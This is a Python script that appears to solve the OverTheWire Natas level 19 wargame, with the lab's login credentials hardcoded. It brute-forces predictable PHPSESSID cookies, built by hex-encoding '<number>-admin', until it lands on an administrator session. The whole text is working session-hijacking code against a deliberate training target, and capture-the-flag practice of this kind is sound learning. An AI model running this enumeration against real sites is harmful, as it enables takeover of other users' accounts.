import requests
import string
from requests.auth import HTTPBasicAuth
url = 'http://natas19.natas.labs.overthewire.org'
auth = HTTPBasicAuth('natas19','4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
data = {'username':'admin', 'password' : 'admin'}
for i in range(1,641,1):
    v = str(str(i)+'-admin')
    value = v.encode('utf-8').hex()
    cookies = dict(PHPSESSID = value)
    r = requests.post(url, auth=auth, cookies=cookies)
    if 'regular' not in r.text:
       print(r.text)
       break
    else:
       print('testing cookies : ' + value)
       continue

